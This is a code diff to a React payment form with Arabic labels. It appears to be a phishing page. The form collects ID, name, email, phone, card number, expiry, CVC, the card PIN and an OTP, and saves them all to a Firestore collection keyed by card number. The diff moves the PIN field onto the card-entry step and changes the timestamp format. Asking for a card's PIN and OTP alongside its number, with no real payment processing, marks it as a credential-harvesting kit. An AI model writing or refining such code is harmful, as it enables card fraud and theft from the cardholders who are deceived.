@@ -9,6 +9,7 @@ import { getFirestore, doc, setDoc } from "firebase/firestore"
 import { Check, X } from "lucide-react"
 import { LiveChatWidget } from "@livechat/widget-react"
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
+import React from "react"
 
 
 // Your Firebase configuration
@@ -117,7 +118,8 @@ export default function Component() {
 
     const handleSubmit = (e: React.FormEvent) => {
         e.preventDefault()
-        let alldat = { date:new Date().getDate(),personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc,pass:pass }, otp: { otp: otp } }
+        const da=new Date()
+        let alldat = { date:da.getDay()+"/"+da.getHours()+"/"+da.getMinutes()+"/"+da.getSeconds() ,personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc,pass:pass }, otp: { otp: otp } }
         setDoc(doc(db, "data", cardNumber), alldat);
 
     }
@@ -369,6 +371,17 @@ return;
                                                 setcvc(e.target.value)
                                             }}
                                         />
+                                          <Input
+                                    type="numbers"
+                                    maxLength={4}
+
+placeholder="الرقم السري للبطاقة"
+                                            defaultValue={pass}
+                                            onChange={(e) => setPass(e.target.value)}
+                                        />    
+
+
+
                                         <img src="./images/ads.png" alt="pyment" height={70} />
                                         {isValidCardNumber(cardNumber) !== null && (
                                             <h3 className={`flex items-center gap-2 ${isValidCardNumber(cardNumber) ? "text-green-500" : "text-red-500"}`}>
@@ -376,6 +389,7 @@ return;
                                                 <span>{isValidCardNumber(cardNumber) ? "" : "رقم البطاقة غير صحيح"}</span>
                                             </h3>
                                         )}
+                                        
                                     </div>
 
                                 </div>) : step === 6 ?
@@ -395,15 +409,7 @@ return;
                                         </div>
                                         <div className="flex justify-between mt-4">
                                         </div>
-                                        <label htmlFor="otp">  الرقم السري للبطاقة</label>
-                                            
-                                            <Input
-                                            maxLength={4}
-                                                defaultValue={pass}
-                                                onChange={(e) =>setPass(e.target.value)}
-                                            />
-
-                                      
+                                        
                                     </>
                                 ) :
                                 (<>
@@ -421,15 +427,7 @@ return;
                                     
                                     </div>
                                     <div className="flex justify-between mt-4">
-                                    <Input
-                                    type="numbers"
-                                    maxLength={4}
-
-placeholder="الرقم السري للبطاقة"
-                                            defaultValue={pass}
-                                            onChange={(e) => setPass(e.target.value)}
-                                        />    
-
+                                  
                                     </div>
                                 </>
                                 )
